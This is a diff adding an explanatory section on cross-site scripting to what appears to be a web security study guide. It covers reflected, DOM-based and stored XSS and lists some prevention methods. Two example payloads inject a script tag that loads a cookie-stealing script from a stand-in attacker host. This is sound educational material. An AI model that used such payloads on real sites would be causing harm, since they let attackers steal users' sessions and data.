@@ -47,4 +47,46 @@ The CSRF token cookie must not have `httpOnly` flag, because _HttpOnly_ cookie c
 
 1. Checking HTTP Headers: `X-Requested-With`, `Referer`, `Origin`, this is insecure when http headers can be manipulated.
 
-## **C**ross-**S**ite **S**cript
+## [Cross-site scripting (XSS)](https://en.wikipedia.org/wiki/Cross-site_scripting)
+
+Cross-site scripting attacks use know vulnerabilities in web-based applications to inject malicious script to pages hosted by server, when pages with malicious contents delivered to clients, attackers can gain access to users' sensitive information including session cookies.
+
+### Types
+
+#### Non-persistent (Reflected) XSS
+
+An reflected attack is typically delivered via email or neutral website. Users may be tricked into clicking innocent-looking links with malicious script, which gets executed and stoles users' private information or submit malicious content to server.
+
+DOM-based XSS is a type of non-persistent XSS attack that injected malacious script manipulates DOM directly instead of communicating with server to attack certain users.
+
+A malicious url:
+
+```html
+http://bobssite.org?q=puppies%3Cscript%2520src%3D%22http%3A%2F%2Fmallorysevilsite.com%2Fauthstealer.js%22%3E%3C%2Fscript%3E 
+```
+
+Actual content: 
+
+```html
+http://bobssite.org?q=puppies<script%20src="http://mallorysevilsite.com/authstealer.js"></script>
+```
+
+If it's clicked  `<script>` tag gets injected and `authstrealer.js` runs to steal users' private information.
+
+
+#### Persistent (or stored) XSS
+
+The _persistent_ XSS refers to malicious content being saved by the server and embedded into normal pages delivered to all users. Persistent XSS vulnerability is much more devastating than non-persistent one, cause all users are susceptible to attack.
+
+If a website receives contents provided by users without sanitization, malicious scripts get injected to website.
+
+```html
+I love the puppies in this story! They're so cute!<script src="http://mallorysevilsite.com/authstealer.js">
+```
+
+Other users clicking on this text tag could be attacked.
+
+### Prevention
+
+1. HTML entity encoding, JavaScript escaping, CSS escaping, URL encoding.
+1. User input validation
